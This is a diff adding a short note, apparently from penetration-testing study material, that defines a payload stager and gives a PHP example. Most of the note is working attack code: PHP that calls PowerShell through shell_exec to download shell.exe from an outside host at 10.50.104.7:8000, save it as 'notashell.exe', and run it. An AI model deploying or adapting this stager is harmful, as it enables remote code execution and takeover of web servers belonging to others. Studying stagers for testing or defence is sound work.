@@ -1,0 +1,28 @@
+payload stager: A stager is a small program, usually hand-optimized assembly, that downloads a payload stage, injects it into memory, and passes execution to it. This process is known as staging.
+
+Ex)
+
+<?php
+  function get_stager() {
+    $init = "powershell.exe";
+    $payload = "Invoke-WebRequest 10.50.104.7:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query; // Execute query
+  }
+  function execute_stager() {
+    $init = "powershell.exe";
+    $payload = ".\notashell.exe"; // Insert PowerShell payload here
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query; // Execute query
+  }
+  get_stager();
+  execute_stager();
+  die();
+?>
+
+
+
+
+
